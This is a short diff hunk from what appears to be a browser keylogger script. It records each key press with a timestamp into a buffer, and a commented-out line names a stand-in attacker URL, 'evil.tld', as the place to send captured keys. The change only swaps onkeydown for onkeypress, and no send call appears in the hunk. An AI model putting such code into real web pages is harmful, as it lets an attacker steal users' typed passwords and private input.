@@ -6,7 +6,7 @@ var buffer = [];
 
 // var attacker = 'http://evil.tld/?c='
 
-document.onkeydown = function(e) {
+document.onkeypress = function(e) {
   var timestamp = Date.now() | 0;
   var stroke = {
     k: e.key,
